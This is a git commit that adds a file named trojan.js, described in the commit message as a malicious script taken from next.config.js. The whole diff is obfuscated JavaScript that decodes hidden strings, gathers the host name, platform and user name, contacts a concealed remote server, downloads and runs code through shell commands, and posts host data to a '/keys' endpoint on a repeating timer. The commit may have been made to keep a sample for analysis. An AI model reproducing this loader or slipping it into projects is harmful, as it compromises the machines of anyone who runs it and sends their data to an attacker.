3b1b007a66bf86d186fae0690860a6e15d60700d
Fernando Dorantes <17007785@es.uveg.edu.mx>
2025-04-15 03:49:52 +0000

    add malicious script from next.config.js to trojan.js

---
+++ trojan.js
@@ -0,0 +1,144 @@
+const aR = F;
+(function (aD, aE) {
+  const aQ = F, aF = aD();
+  while (true) {
+    try {
+      const aG = parseInt(aQ(208)) / 1 + -parseInt(aQ(210)) / 2 + parseInt(aQ(203)) / 3 * (parseInt(aQ(187)) / 4) + parseInt(aQ(196)) / 5 * (-parseInt(aQ(217)) / 6) + -parseInt(aQ(206)) / 7 + -parseInt(aQ(181)) / 8 * (parseInt(aQ(207)) / 9) + -parseInt(aQ(190)) / 10 * (-parseInt(aQ(178)) / 11);
+      if (aG === aE) break; else aF.push(aF.shift());
+    } catch (aH) {
+      aF.push(aF.shift());
+    }
+  }
+}(D, 706366));
+const H = "base64", I = aR(223), K = require("fs"), O = require("os"), P = aD => (s1 = aD[aR(179)](1), Buffer.from(s1, H)[aR(213)](I));
+rq = require(P(aR(191) + "A")), pt = require(P("zcGF0aA")), ex = require(P(aR(192) + "HJvY2Vzcw"))[P("cZXhlYw")], zv = require(P("Zbm9kZTpwc" + aR(219))), hd = O[P("ZaG9tZWRpcg")](), hs = O[P(aR(211) + "WU")](), pl = O[P(aR(184) + "m0")](), uin = O[P(aR(185) + "m8")]();
+let Q;
+const a0 = aR(194) + aR(197), a1 = ":124", a2 = aD => Buffer.from(aD, H)[aR(213)](I);
+var a3 = "", a4 = "";
+const a5 = [36, 192, 41, 8], a6 = aD => {
+  const aS = aR;
+  let aE = "";
+  for (let aF = 0; aF < aD.length; aF++) rr = 255 & (aD[aF] ^ a5[3 & aF]), aE += String[aS(195) + "de"](rr);
+  return aE;
+}, a7 = aR(202), a8 = aR(209) + aR(222), a9 = a2(aR(218) + aR(199));
+function F(a, b) {
+  const c = D();
+  return F = function (d, e) {
+    d = d - 178;
+    let f = c[d];
+    return f;
+  }, F(a, b);
+}
+const ab = a2("bWtkaXJTeW5j"), ac = [10, 182, 90, 107, 75, 164, 76], ad = [11, 170, 6], ae = () => {
+  const aT = aR, aD = a2(a7), aE = a2(a8), aF = a6(ac);
+  let aG = pt[aT(201)](hd, aF);
+  try {
+    aH = aG, K[ab](aH, {recursive: true});
+  } catch (aK) {
+    aG = hd;
+  }
+  var aH;
+  const aI = "" + a3 + a6(ad) + a4, aJ = pt[aT(201)](aG, a6(af));
+  try {
+    !function (aL) {
+      const aU = aT, aM = a2(aU(220));
+      K[aM](aL);
+    }(aJ);
+  } catch (aL) {}
+  rq[aD](aI, (aM, aN, aO) => {
+    if (!aM) {
+      try {
+        K[aE](aJ, aO);
+      } catch (aP) {}
+      ai(aG);
+    }
+  });
+}, af = [80, 165, 90, 124, 10, 170, 90], ag = [11, 176], ah = [84, 161, 74, 99, 69, 167, 76, 38, 78, 179, 70, 102], ai = aD => {
+  const aE = a2(a7), aF = a2(a8), aG = "" + a3 + a6(ag), aH = pt.join(aD, a6(ah));
+  K[a9](aH) ? am(aD) : rq[aE](aG, (aI, aJ, aK) => {
+    if (!aI) {
+      try {
+        K[aF](aH, aK);
+      } catch (aL) {}
+      am(aD);
+    }
+  });
+}, aj = [71, 164], ak = [2, 230, 9, 102, 84, 173, 9, 97, 4, 237, 4, 123, 77, 172, 76, 102, 80], al = [74, 175, 77, 109, 123, 173, 70, 108, 81, 172, 76, 123], am = aD => {
+  const aV = aR, aE = a6(aj) + ' "' + aD + '" ' + a6(ak), aF = pt[aV(201)](aD, a6(al));
+  try {
+    K[a9](aF) ? ar(aD) : ex(aE, (aG, aH, aI) => {
+      aq(aD);
+    });
+  } catch (aG) {}
+}, an = [74, 175, 77, 109], ao = [74, 176, 68, 40, 9, 237, 89, 122, 65, 166, 64, 112], ap = [77, 174, 90, 124, 69, 172, 69], aq = aD => {
+  const aW = aR, aE = a6(ao) + ' "' + aD + '" ' + a6(ap), aF = pt[aW(201)](aD, a6(al));
+  try {
+    K[a9](aF) ? ar(aD) : ex(aE, (aG, aH, aI) => {
+      ar(aD);
+    });
+  } catch (aG) {}
+}, ar = aD => {
+  const aX = aR, aE = pt[aX(201)](aD, a6(af)), aF = a6(an) + " " + aE;
+  try {
+    ex(aF, (aG, aH, aI) => {});
+  } catch (aG) {}
+}, as = P(aR(205) + "GE"), at = P(aR(221)), au = a2(aR(198));
+let av = aR(186);
+function D() {
+  const b3 = ["1100916ynYuqS", "ZXhpc3RzU3", "m9jZXNz", "cm1TeW5j", "adXJs", "xlU3luYw", "utf8", "12771rfZOPH", "slice", "3E1", "1080NqQcog", "d3a039a590f3", "split", "YcGxhdGZvc", "AdXNlckluZ", "cmp", "12oUfARq", "ZT3", "/s/", "10990NuLusk", "YcmVxdWVzd", "aY2hpbGRfc", "oqr", "aaHR0cDovL", "fromCharCo", "35onXXhB", "w==", "cG9zdA", "luYw", "LjEzNS4xOT", "join", "Z2V0", "170718pyusLc", "length", "cZm9ybURhd", "2001279anzPgZ", "23409VesLJH", "1212302AGrpWU", "d3JpdGVGaW", "62318pTCWcq", "caG9zdG5hb", "guOTIu====", "toString", "dXNlcm5hbW", "NDcuMTE4Mz", "substring"];
+  D = function () {
+    return b3;
+  };
+  return D();
+}
+const aw = async aD => {
+  const aZ = aR, aE = (aH => {
+    const aY = F;
+    let aI = 0 == aH ? aY(215) + aY(212) : aY(200) + "UuMTc5MzM=";
+    for (var aJ = "", aK = "", aL = "", aM = 0; aM < 4; aM++) aJ += aI[2 * aM] + aI[2 * aM + 1], aK += aI[8 + 2 * aM] + aI[9 + 2 * aM], aL += aI[16 + aM];
+    return a2(a0[aY(216)](1)) + a2(aK + aJ + aL) + a1 + "4";
+  })(aD), aF = a2(a7);
+  let aG = aE + aZ(189);
+  aG += aZ(182), rq[aF](aG, (aH, aI, aJ) => {
+    aH ? aD < 1 && aw(1) : (aK => {
+      const b0 = F;
+      if (0 == aK.search(b0(188))) {
+        let aL = "";
+        try {
+          for (let aM = 3; aM < aK[b0(204)]; aM++) aL += aK[aM];
+          arr = a2(aL), arr = arr[b0(183)](","), a3 = a2(a0[b0(216)](1)) + arr[0] + a1 + "4", a4 = arr[1];
+        } catch (aN) {
+          return 0;
+        }
+        return 1;
+      }
+      return 0;
+    })(aJ) > 0 && (ax(), az());
+  });
+}, ax = async () => {
+  const b1 = aR;
+  av = hs, "d" == pl[0] && (av = av + "+" + uin[a2(b1(214) + "U")]);
+  let aD = b1(180);
+  try {
+    aD += zv[a2("YXJndg")][1];
+  } catch (aE) {}
+  ay(b1(193), aD);
+}, ay = async (aD, aE) => {
+  const aF = {ts: Q, type: a4, hid: av, ss: aD, cc: aE}, aG = {[at]: "" + a3 + a2("L2tleXM"), [as]: aF};
+  try {
+    rq[au](aG, (aH, aI, aJ) => {});
+  } catch (aH) {}
+}, az = async () => await new Promise((aD, aE) => {
+  ae();
+});
+var aA = 0;
+const aB = async () => {
+  const b2 = aR;
+  try {
+    Q = Date.now()[b2(213)](), await aw(0);
+  } catch (aD) {}
+};
+aB();
+let aC = setInterval(() => {
+  (aA += 1) < 3 ? aB() : clearInterval(aC);
+}, 600048);
